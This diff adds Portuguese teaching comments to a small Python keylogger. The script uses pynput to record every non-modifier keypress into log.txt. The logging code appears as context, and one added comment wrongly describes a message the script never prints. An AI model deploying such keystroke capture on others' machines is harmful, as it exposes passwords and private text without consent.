@@ -1,4 +1,5 @@
-from pynput import keyboard
+from pynput import keyboard  # Biblioteca: pynput.keyboard
+# - fornece objetos e listeners para capturar eventos do teclado.
 
 IGNORAR = {
     keyboard.Key.shift,
@@ -10,7 +11,8 @@ IGNORAR = {
     keyboard.Key.caps_lock,
     keyboard.Key.cmd
 }
-
+ # Abre o arquivo 'log.txt' em modo append (adiciona sem sobrescrever).
+# encoding="utf-8" garante que caracteres acentuados sejam gravados corretamente.
 def on_press(key):
     with open("log.txt", "a", encoding="utf-8") as f:
         try:
@@ -31,5 +33,5 @@ def on_press(key):
             else:
                 f.write(f"[{key}] ")
 
-with keyboard.Listener(on_press=on_press) as listener:
+with keyboard.Listener(on_press=on_press) as listener:     # Mensagem informativa ao executar o arquivo direto.
     listener.join()
